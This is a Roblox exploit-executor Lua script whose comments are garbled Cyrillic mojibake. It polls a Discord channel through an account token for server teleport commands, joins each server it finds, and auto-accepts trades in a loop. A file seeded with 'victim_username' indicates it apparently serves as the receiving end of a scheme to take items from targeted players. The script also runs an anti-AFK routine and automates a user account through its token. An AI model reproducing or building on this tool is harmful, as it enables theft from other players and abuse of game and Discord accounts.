if not game:IsLoaded() then
    game.Loaded:Wait()
    print("‚úÖ –ò–≥—Ä–∞ –∑–∞–≥—Ä—É–∂–µ–Ω–∞")
end

-- –ü—Ä–æ–≤–µ—Ä–∫–∞ —Ç–æ–∫–µ–Ω–∞ –∏ ID –∫–∞–Ω–∞–ª–∞
if token == "" or channelId == "" then
    game.Players.LocalPlayer:Kick("‚ùå –í–≤–µ–¥–∏ —Ç–æ–∫–µ–Ω –∏ channelId!")
    return
end

-- Anti-AFK
local VirtualUser = game:GetService('VirtualUser')
game:GetService('Players').LocalPlayer.Idled:Connect(function()
    VirtualUser:CaptureController()
    VirtualUser:ClickButton2(Vector2.new())
end)

-- –ù–∞—Å—Ç—Ä–æ–π–∫–∏ —Ñ–∞–π–ª–æ–≤
local HttpService = game:GetService("HttpService")
if not isfile("user.txt") then writefile("user.txt", "victim_username") end
if not isfile("joined_ids.txt") then writefile("joined_ids.txt", "[]") end

local victimUser = readfile("user.txt")
local joinedIds = HttpService:JSONDecode(readfile("joined_ids.txt"))
local isTeleporting = false

-- –£–ª—å—Ç—Ä–∞-–Ω–∞–¥—ë–∂–Ω—ã–π –ø–∞—Ä—Å–µ—Ä
local function findTeleportCommand(content)
    if not content then return nil, nil end
    
    -- –£–Ω–∏–≤–µ—Ä—Å–∞–ª—å–Ω—ã–π –ø–∞—Ç—Ç–µ—Ä–Ω –¥–ª—è –ª—é–±—ã—Ö –≤–∞—Ä–∏–∞–Ω—Ç–æ–≤
    local pattern = '[gG]ame%s*[:%.]%s*[gG]et[Ss]ervice%s*%(%s*["\']TeleportService["\']%s*%)%s*:%s*[tT]eleport[tT]o[pP]lace[iI]nstance%s*%(%s*(%d+)%s*,%s*["\']([%w%-]+)["\']'
    
    local placeId, jobId = content:match(pattern)
    return placeId, jobId
end

-- –û—Å–Ω–æ–≤–Ω–∞—è —Ñ—É–Ω–∫—Ü–∏—è
local function checkDiscord()
    local response = request({
        Url = "https://discord.com/api/v9/channels/"..channelId.."/messages?limit=10",
        Method = "GET",
        Headers = {
            ['Authorization'] = token,
            ['Content-Type'] = 'application/json'
        }
    })

    if not response.Success then
        warn("‚ùå –û—à–∏–±–∫–∞ Discord:", response.StatusCode)
        return
    end

    local messages = HttpService:JSONDecode(response.Body)
    for _, msg in ipairs(messages) do
        if msg.content then
            print("üîç –ü—Ä–æ–≤–µ—Ä—è–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ:", string.sub(msg.content, 1, 50).."...")
            
            local placeId, jobId = findTeleportCommand(msg.content)
            if placeId and jobId then
                print("üéØ –ù–∞–π–¥–µ–Ω—ã ID:", placeId, jobId)
                
                if not table.find(joinedIds, msg.id) then
                    table.insert(joinedIds, msg.id)
                    writefile("joined_ids.txt", HttpService:JSONEncode(joinedIds))
                    
                    print("üöÄ –¢–µ–ª–µ–ø–æ—Ä—Ç–∏—Ä—É–µ–º—Å—è...")
                    isTeleporting = true
                    local success = pcall(function()
                        game:GetService("TeleportService"):TeleportToPlaceInstance(tonumber(placeId), jobId)
                    end)
                    
                    if not success then
                        isTeleporting = false
                        warn("‚ùå –û—à–∏–±–∫–∞ —Ç–µ–ª–µ–ø–æ—Ä—Ç–∞—Ü–∏–∏")
                    end
                    return
                else
                    print("‚ö†Ô∏è –£–∂–µ –±—ã–ª–∏ –Ω–∞ —ç—Ç–æ–º —Å–µ—Ä–≤–µ—Ä–µ")
                end
            end
        end
    end
end

-- –ê–≤—Ç–æ–ø—Ä–∏–Ω—è—Ç–∏–µ —Ç—Ä–µ–π–¥–æ–≤
local function autoAcceptTrade()
    while task.wait(1) do
        pcall(function()
            game:GetService("ReplicatedStorage").Trade.AcceptRequest:FireServer()
            game:GetService("ReplicatedStorage").Trade.AcceptTrade:FireServer()
        end)
    end
end

-- –ó–∞–ø—É—Å–∫
task.spawn(autoAcceptTrade)

print("‚ú® –°–∫—Ä–∏–ø—Ç –∑–∞–ø—É—â–µ–Ω!")
while task.wait(5) do
    if not isTeleporting then
        pcall(checkDiscord)
    end
end
